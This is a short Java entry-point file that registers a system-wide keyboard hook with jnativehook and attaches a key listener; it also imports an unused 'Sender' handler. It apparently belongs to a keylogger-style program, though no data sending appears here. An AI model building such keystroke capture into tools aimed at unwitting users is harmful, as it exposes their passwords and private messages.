package main;


import handlers.ManageService;
import handlers.Sender;
import keys.NativeKeyboard;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.Level;
import java.util.logging.Logger;

public class Main {

//
//  I am typing a in a pretty way, what is upi? how are you
//
//


    public static void main(String[] args) {

        ManageService service = new ManageService();
        try {
            GlobalScreen.registerNativeHook();
        } catch (Throwable e) {
            e.printStackTrace();
        }

       GlobalScreen.addNativeKeyListener(service.getKeyboard());
    }
}
